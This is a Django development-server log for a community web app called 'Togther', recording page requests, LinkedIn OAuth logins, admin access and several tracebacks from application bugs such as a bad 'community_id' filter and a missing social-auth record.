/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
[07/Dec/2018 03:30:19] "GET / HTTP/1.1" 200 2428
Not Found: /favicon.ico
[07/Dec/2018 03:30:20] "GET /favicon.ico HTTP/1.1" 404 5943
[07/Dec/2018 03:30:21] "GET / HTTP/1.1" 200 2428
[07/Dec/2018 03:30:22] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
Not Found: /togther/
[07/Dec/2018 03:32:07] "GET /togther/ HTTP/1.1" 404 5934
Not Found: /favicon.ico
[07/Dec/2018 03:32:08] "GET /favicon.ico HTTP/1.1" 404 5943
Not Found: /togther/
[07/Dec/2018 03:32:09] "GET /togther/ HTTP/1.1" 404 5934
[07/Dec/2018 03:32:15] "GET /dashboard/ HTTP/1.1" 200 9686
[07/Dec/2018 03:32:16] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[07/Dec/2018 03:32:22] "GET /admin HTTP/1.1" 301 0
[07/Dec/2018 03:32:22] "GET /admin/ HTTP/1.1" 302 0
[07/Dec/2018 03:32:23] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1819
[07/Dec/2018 03:32:23] "GET /static/admin/css/login.css HTTP/1.1" 200 1203
[07/Dec/2018 03:32:23] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
[07/Dec/2018 03:32:23] "GET /static/admin/css/base.css HTTP/1.1" 304 0
[07/Dec/2018 03:32:24] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
[07/Dec/2018 03:32:25] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 80304
[07/Dec/2018 03:32:25] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 81348
[07/Dec/2018 03:32:32] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
[07/Dec/2018 03:32:32] "GET /admin/ HTTP/1.1" 200 10019
[07/Dec/2018 03:32:33] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
[07/Dec/2018 03:32:33] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
[07/Dec/2018 03:32:33] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
[07/Dec/2018 03:32:33] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
[07/Dec/2018 03:32:34] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 82564
[07/Dec/2018 03:33:01] "GET / HTTP/1.1" 200 2428
[07/Dec/2018 03:33:02] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
[07/Dec/2018 03:33:04] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[07/Dec/2018 03:33:10] "GET /oauth/complete/linkedin-oauth2/?code=AQQ4Kn182kD_YYG5qQD5rSGG29W6tpFZ9ghMvobWwcb_1n-JzcioijGUesaKOHm45IIH5IWt_Q2k0pKz6a9UH7BxSVI-uYcUYH0EjAPC4PDKH8voG4KJgC2y7If4kWvCxi7AdDghgZQJrs1aZOQxPlq5RJ9w7boxN-PQEgkY1EuCXsGQDAcINrlkxOcTWg&state=Hj3Nqj7axEEASPgXvA2TXhBxlK27CCy6 HTTP/1.1" 302 0
[07/Dec/2018 03:33:11] "GET /dashboard/ HTTP/1.1" 200 10395
Not Found: /dashboard/logo.jpeg
[07/Dec/2018 03:33:12] "GET /dashboard/logo.jpeg HTTP/1.1" 404 5967
[07/Dec/2018 03:34:01] "GET /admin/logout/ HTTP/1.1" 200 1207
[07/Dec/2018 03:34:03] "GET / HTTP/1.1" 200 2428
[07/Dec/2018 03:34:05] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[07/Dec/2018 03:34:15] "GET /oauth/complete/linkedin-oauth2/?code=AQTHjFlmrm-1stXhlT9c2SH-nDQN77CZzN_Pp7NZrsDkH6lEGNTBzONyV5KO5QC0FQtckoBMyCvbijWA14q7LeRkX7nfkCw8aV1I9_jz_JcoFlcqB93mMsFHXy5iWSRZbIdZi-NjAOxlMMC7G0tZ4LRPjdlTgM94ZumI9ZLk6_1q4ay_mcs64BBwbrAqww&state=IjeE50L6CXxbDsGnYVOxfW5S7YPvrqv3 HTTP/1.1" 302 0
[07/Dec/2018 03:34:16] "GET /dashboard/ HTTP/1.1" 200 10395
[07/Dec/2018 03:34:28] "GET /profile/4 HTTP/1.1" 200 21672
Not Found: /profile/logo.jpeg
[07/Dec/2018 03:34:29] "GET /profile/logo.jpeg HTTP/1.1" 404 5961
[07/Dec/2018 03:34:31] "GET /profile/4 HTTP/1.1" 200 21672
[07/Dec/2018 03:34:32] "GET /creategroup/ HTTP/1.1" 200 5759
Not Found: /creategroup/logo.jpeg
[07/Dec/2018 03:34:33] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5973
[07/Dec/2018 03:35:40] "GET / HTTP/1.1" 302 0
[07/Dec/2018 03:35:41] "GET /dashboard/ HTTP/1.1" 200 10395
[07/Dec/2018 03:35:57] "GET / HTTP/1.1" 200 2428
[07/Dec/2018 03:36:01] "GET /dashboard/ HTTP/1.1" 200 9686
[07/Dec/2018 03:36:40] "GET /dashboard/ HTTP/1.1" 200 10395
[07/Dec/2018 03:36:41] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[07/Dec/2018 03:36:42] "GET /profile/4 HTTP/1.1" 200 21672
[07/Dec/2018 03:36:50] "GET /profile/4 HTTP/1.1" 200 21672
[07/Dec/2018 03:36:52] "GET /profile/4 HTTP/1.1" 200 21672
[07/Dec/2018 03:36:53] "GET /creategroup/ HTTP/1.1" 200 5759
Internal Server Error: /creategroup/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 152, in creategroup
    community = Community.objects.all().filter(community_id = group.id)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1164, in build_filter
    lookups, parts, reffed_expression = self.solve_lookup_type(arg)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1028, in solve_lookup_type
    _, field, _, lookup_parts = self.names_to_path(lookup_splitted, self.get_meta())
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
    "Choices are: %s" % (name, ", ".join(available)))
django.core.exceptions.FieldError: Cannot resolve keyword 'community_id' into field. Choices are: about, active_since, admins, category, form_data, id, image_url, location, members, members_count, name, purpose, requests, whatsapp_group_link
[07/Dec/2018 03:37:41] "POST /creategroup/ HTTP/1.1" 500 110817
[07/Dec/2018 03:37:54] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
Internal Server Error: /creategroup/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 152, in creategroup
    community = Community.objects.all().filter(community_id = group.id)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 841, in filter
    return self._filter_or_exclude(False, *args, **kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/query.py", line 859, in _filter_or_exclude
    clone.query.add_q(Q(*args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
    clause, _ = self._add_q(q_object, self.used_aliases)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
    split_subq=split_subq,
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1164, in build_filter
    lookups, parts, reffed_expression = self.solve_lookup_type(arg)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1028, in solve_lookup_type
    _, field, _, lookup_parts = self.names_to_path(lookup_splitted, self.get_meta())
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
    "Choices are: %s" % (name, ", ".join(available)))
django.core.exceptions.FieldError: Cannot resolve keyword 'community_id' into field. Choices are: about, active_since, admins, category, form_data, id, image_url, location, members, members_count, name, purpose, requests, whatsapp_group_link
[07/Dec/2018 03:38:05] "POST /creategroup/ HTTP/1.1" 500 110892
[07/Dec/2018 03:38:44] "GET /profile/4 HTTP/1.1" 200 21672
[07/Dec/2018 03:38:50] "GET /profile/4 HTTP/1.1" 200 21672
[07/Dec/2018 03:38:53] "GET / HTTP/1.1" 302 0
[07/Dec/2018 03:38:53] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 03:39:00] "GET /creategroup/ HTTP/1.1" 200 5759
[07/Dec/2018 03:39:00] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
Not Found: /creategroup/logo.jpeg
[07/Dec/2018 03:39:01] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5973
[07/Dec/2018 03:39:19] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 03:40:20] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 03:40:24] "GET /community/2/members_list HTTP/1.1" 200 4734
Not Found: /community/2/logo.jpeg
[07/Dec/2018 03:40:25] "GET /community/2/logo.jpeg HTTP/1.1" 404 5973
[07/Dec/2018 03:40:34] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 03:40:37] "GET /community/2 HTTP/1.1" 301 0
[07/Dec/2018 03:40:38] "GET /community/2/ HTTP/1.1" 200 9037
Not Found: /community/2/media/IMG_20181201_152335.jpg
[07/Dec/2018 03:40:39] "GET /community/2/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/2/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 03:40:39] "GET /community/2/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
[07/Dec/2018 03:40:39] "GET /community/2/members_list HTTP/1.1" 200 4734
Not Found: /community/2/media/IMG_20181201_152335.jpg
[07/Dec/2018 03:40:42] "GET /community/2/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/2/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 03:40:42] "GET /community/2/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
[07/Dec/2018 03:40:43] "GET /community/2/ HTTP/1.1" 200 9037
Not Found: /community/2/media/IMG_20181201_152335.jpg
[07/Dec/2018 03:40:44] "GET /community/2/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/2/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 03:40:44] "GET /community/2/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
Internal Server Error: /community/2/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/contrib/auth/decorators.py", line 21, in _wrapped_view
    return view_func(request, *args, **kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 371, in join_community
    return render(request,'response_form.html',{"data":data, 'usr':user})
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/shortcuts.py", line 36, in render
    content = loader.render_to_string(template_name, context, request, using=using)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader.py", line 62, in render_to_string
    return template.render(context, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/backends/django.py", line 61, in render
    return self.template.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 171, in render
    return self._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 150, in render
    return compiled_parent._render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 163, in _render
    return self.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/loader_tags.py", line 62, in render
    result = block.nodelist.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 937, in render
    bit = node.render_annotated(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/base.py", line 904, in render_annotated
    return self.render(context)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/template/defaulttags.py", line 442, in render
    url = reverse(view_name, args=args, kwargs=kwargs, current_app=current_app)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/base.py", line 90, in reverse
    return iri_to_uri(resolver._reverse_with_prefix(view, prefix, *args, **kwargs))
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/urls/resolvers.py", line 622, in _reverse_with_prefix
    raise NoReverseMatch(msg)
django.urls.exceptions.NoReverseMatch: Reverse for 'community' with arguments '('',)' not found. 1 pattern(s) tried: ['community/(?P<community_id>[0-9]+)/$']
[07/Dec/2018 03:40:53] "GET /community/2/join HTTP/1.1" 500 166466
Not Found: /community/2/media/IMG_20181201_152335.jpg
[07/Dec/2018 03:40:57] "GET /community/2/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/2/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 03:40:57] "GET /community/2/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
[07/Dec/2018 03:41:19] "GET /community/1/members_list HTTP/1.1" 200 4734
Not Found: /community/1/logo.jpeg
[07/Dec/2018 03:41:20] "GET /community/1/logo.jpeg HTTP/1.1" 404 5973
[07/Dec/2018 03:41:24] "GET /community/1/ HTTP/1.1" 200 9029
Not Found: /community/1/media/IMG_20181201_152335.jpg
[07/Dec/2018 03:41:25] "GET /community/1/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6033
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 03:41:25] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
[07/Dec/2018 03:41:31] "GET /community/1/members_list HTTP/1.1" 200 4734
Not Found: /community/1/media/IMG_20181201_152335_6yO0iAi.jpg
[07/Dec/2018 03:41:34] "GET /community/1/media/IMG_20181201_152335_6yO0iAi.jpg HTTP/1.1" 404 6057
[07/Dec/2018 03:41:35] "GET /profile/4 HTTP/1.1" 200 21672
[07/Dec/2018 03:41:41] "GET /profile/4/mycommunities HTTP/1.1" 200 4714
Not Found: /profile/4/logo.jpeg
[07/Dec/2018 03:41:42] "GET /profile/4/logo.jpeg HTTP/1.1" 404 5967
[07/Dec/2018 03:41:44] "GET /profile/4/communities_as_admin HTTP/1.1" 200 4738
[07/Dec/2018 03:41:45] "GET /profile/4/communities_as_admin HTTP/1.1" 200 4738
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 03:43:21] "GET / HTTP/1.1" 400 62047
[07/Dec/2018 03:44:56] "GET /profile/4/communities_as_admin HTTP/1.1" 200 4738
[07/Dec/2018 03:44:57] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[07/Dec/2018 03:44:59] "GET / HTTP/1.1" 302 0
[07/Dec/2018 03:45:00] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 03:45:04] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 03:48:49] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 03:56:53] "GET / HTTP/1.1" 302 0
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[07/Dec/2018 03:56:53] "GET /dashboard/ HTTP/1.1" 500 66925
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[07/Dec/2018 03:57:06] "GET /dashboard/ HTTP/1.1" 500 67060
[07/Dec/2018 03:57:08] "GET / HTTP/1.1" 302 0
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[07/Dec/2018 03:57:08] "GET /dashboard/ HTTP/1.1" 500 66925
Internal Server Error: /dashboard/lout
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
TypeError: dashboard() got an unexpected keyword argument 'data'
[07/Dec/2018 03:57:17] "GET /dashboard/lout HTTP/1.1" 500 62642
Internal Server Error: /dashboard/logout
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
TypeError: dashboard() got an unexpected keyword argument 'data'
[07/Dec/2018 03:57:21] "GET /dashboard/logout HTTP/1.1" 500 62670
[07/Dec/2018 03:57:25] "GET / HTTP/1.1" 302 0
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[07/Dec/2018 03:57:25] "GET /dashboard/ HTTP/1.1" 500 66925
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 03:59:45] "GET / HTTP/1.0" 400 62059
[07/Dec/2018 04:02:08] "GET / HTTP/1.1" 302 0
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[07/Dec/2018 04:02:08] "GET /dashboard/ HTTP/1.1" 500 67053
[07/Dec/2018 04:03:58] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 04:03:59] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[07/Dec/2018 04:04:03] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 04:04:26] "GET /dashboard/ HTTP/1.1" 200 12911
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 04:05:02] "GET / HTTP/1.1" 400 62164
[07/Dec/2018 04:07:03] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 04:15:59] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 04:16:00] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[07/Dec/2018 05:20:31] "GET / HTTP/1.1" 302 0
[07/Dec/2018 05:20:31] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 05:20:32] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
[07/Dec/2018 05:20:35] "GET /dashboard/ HTTP/1.1" 200 12911
[07/Dec/2018 05:20:39] "GET /profile/4/mycommunities HTTP/1.1" 200 4714
[07/Dec/2018 05:20:41] "GET /profile/4/mycommunities HTTP/1.1" 200 4714
[07/Dec/2018 05:20:43] "GET /profile/4/communities_as_admin HTTP/1.1" 200 4738
[07/Dec/2018 05:20:44] "GET /profile/4/communities_as_admin HTTP/1.1" 200 4738
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 05:34:42] "GET / HTTP/1.0" 400 62057
Not Found: /profile/4/logo.jpeg
[07/Dec/2018 06:04:11] "GET /profile/4/logo.jpeg HTTP/1.1" 404 5967
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 06:19:15] "GET / HTTP/1.1" 400 62046
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 07:03:29] "GET / HTTP/1.0" 400 62058
[07/Dec/2018 07:14:19] "GET / HTTP/1.1" 302 0
Internal Server Error: /dashboard/
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 34, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[07/Dec/2018 07:14:19] "GET /dashboard/ HTTP/1.1" 500 66925
[07/Dec/2018 07:14:33] "GET /dashboard/ HTTP/1.1" 200 12202
[07/Dec/2018 07:14:33] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
Not Found: /dashboard/logo.jpeg
[07/Dec/2018 07:14:35] "GET /dashboard/logo.jpeg HTTP/1.1" 404 5967
Not Found: /dashboard/media/media/IMG_20181201_152335.jpg
[07/Dec/2018 07:15:12] "GET /dashboard/media/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6045
[07/Dec/2018 07:15:49] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 200 4146379
[07/Dec/2018 07:17:12] "GET /dashboard/ HTTP/1.1" 200 12202
[07/Dec/2018 07:17:12] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
Not Found: /dashboard/media/media/IMG_20181201_152335.jpg
[07/Dec/2018 07:17:32] "GET /dashboard/media/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6045
Not Found: //media/media/IMG_20181201_152335.jpg
[07/Dec/2018 07:17:43] "GET //media/media/IMG_20181201_152335.jpg HTTP/1.1" 404 6018
[07/Dec/2018 07:19:09] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 200 4146379
[07/Dec/2018 07:20:16] "GET /dashboard/ HTTP/1.1" 200 12202
[07/Dec/2018 07:20:16] "GET /media/media/logo.jpeg HTTP/1.1" 200 28619
[07/Dec/2018 07:20:36] "GET /media/media/IMG_20181201_152335.jpg HTTP/1.1" 200 4146379
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 07:32:00] "GET / HTTP/1.1" 400 62799
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /favicon.ico
[07/Dec/2018 07:32:01] "GET /favicon.ico HTTP/1.1" 400 62877
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 07:57:09] "GET / HTTP/1.0" 400 62057
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 08:00:43] "GET / HTTP/1.1" 400 62047
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 08:10:40] "GET / HTTP/1.1" 400 62178
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 08:15:48] "GET / HTTP/1.1" 400 62046
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 08:49:45] "GET / HTTP/1.1" 400 62046
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 09:24:32] "GET / HTTP/1.1" 400 62054
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[07/Dec/2018 09:49:40] "GET / HTTP/1.1" 400 62054
[07/Dec/2018 09:56:06] "GET / HTTP/1.1" 200 2428
[07/Dec/2018 09:56:07] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
